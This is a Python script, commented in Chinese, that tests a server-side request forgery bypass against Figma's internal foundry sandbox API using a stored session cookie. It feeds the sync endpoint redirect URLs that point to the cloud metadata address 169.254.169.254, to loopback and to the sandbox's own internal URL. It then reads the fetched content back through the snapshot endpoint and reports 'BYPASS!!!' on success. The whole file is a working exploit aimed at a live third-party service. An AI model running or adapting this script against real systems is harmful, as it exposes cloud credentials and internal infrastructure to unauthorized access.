"""foundry redirect 绕过单测(精简): requests + 严格超时
目标: redirect->IMDS 若 REACHED => SSRF 升级; 否则收束
"""
import io, json, sys, base64, re
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
import requests

CK = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
UID = "1667396392129259941"
PUB_KEY = "bv2nMIdFf4u3dESGail4sm"

def call(path, body, timeout=15):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json", "Cookie": CK,
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web",
            "X-Figma-User-ID": UID, "X-Figma-File-Key": PUB_KEY}
    try:
        r = requests.post("https://www.figma.com" + path, json=body, headers=hdrs, timeout=timeout)
        return r.status_code, r.text, r.elapsed.total_seconds()
    except Exception as e:
        return 0, f"!! {type(e).__name__} {str(e)[:80]}", 0

print("== sandbox ==", flush=True)
st, resp, _ = call("/api/cortex/foundry/sandbox", {})
print("sandbox:", st, resp[:150], flush=True)
if st != 200:
    print("sandbox FAIL, abort", flush=True)
    sys.exit(1)
SBOX = json.loads(resp)["sboxdUrl"]

def ssrf_fetch(url, tag, verbose=False):
    fname = "code/DP_%s.txt" % tag
    body = {"vfsChangeByPath": {tag: {"type": "upsert",
            "entry": {"path": fname, "downloadUrl": url, "metadata": {"version": "1", "guid": "g1"}}}},
            "entrypointsByIdentifier": {}}
    st1, r1, dt1 = call("/api/cortex/foundry/sync", body)
    st2, snap, dt2 = call("/api/cortex/foundry/fs-snapshot",
                     {"sboxdUrl": SBOX, "path": "code/src/" + fname, "options": {"content": "snapshot"}})
    content = ""
    for m in re.findall(r'data: (\{.*?\})\n', snap, re.S):
        try:
            o = json.loads(m)
        except Exception:
            continue
        if o.get("type") == "fswatch/event" and o.get("content"):
            content = base64.b64decode(o["content"]).decode(errors='replace')
    print(f"[{tag}] sync={st1}({dt1:.1f}s) snap={st2}({dt2:.1f}s) -> {'REACHED' if content else 'NOT-REACHED'}", flush=True)
    if content:
        print(f"    >>> CONTENT: {content[:300].strip()}", flush=True)
    if verbose and not content:
        print(f"    sync_body: {r1[:300]}", flush=True)
    return content

print("\n== [基线] 302 redirect -> 公网 httpbin ==", flush=True)
c0 = ssrf_fetch("https://httpbin.org/redirect-to?url=https%3A%2F%2Fhttpbin.org%2Frobots.txt", "p_redir_pub", verbose=True)

print("\n== [绕过] 302 redirect -> IMDS ==", flush=True)
c1 = ssrf_fetch("https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", "r_imds", verbose=True)

print("\n== [绕过] 302 redirect -> 127.0.0.1 ==", flush=True)
c2 = ssrf_fetch("https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%2F", "r_loop")

print("\n== [绕过] 302 redirect -> sandbox 内部 ==", flush=True)
c3 = ssrf_fetch("https://httpbin.org/redirect-to?url=" + SBOX.replace("http", "http", 1).replace("/", "%2F"), "r_sbox")

verdict = "BYPASS!!!" if (c1 or c2 or c3) else "isolated"
print("\n== 结论: " + verdict, flush=True)
